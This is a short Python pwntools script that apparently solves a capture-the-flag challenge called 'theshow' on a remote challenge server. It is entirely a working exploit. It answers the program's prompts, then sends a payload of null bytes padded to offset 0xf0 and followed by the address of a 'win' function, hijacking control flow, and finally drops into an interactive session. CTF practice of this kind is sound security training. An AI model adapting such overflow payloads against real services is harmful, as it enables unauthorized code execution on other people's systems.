from pwn import *
filename="./theshow"
# io = process(filename)
io = remote('0.cloud.chals.io', 30138)
context.log_level='debug'
elf=ELF(filename)
context.terminal=['tmux','split','-hp','60']


def debug():
    gdb.attach(io,"b *0x4012E6")



io.recvuntil('What is the name of your act?')
io.sendline('aaa')
io.recvuntil('How long do you want the show description to be?')
io.sendline('120')
io.recvuntil('Describe the show for us:')
# debug()
payload = b'\x00'*0x0000f0+p64(elf.sym['win'])
io.sendline(payload)
io.recvuntil('Action:')
io.sendline('1')


io.interactive()
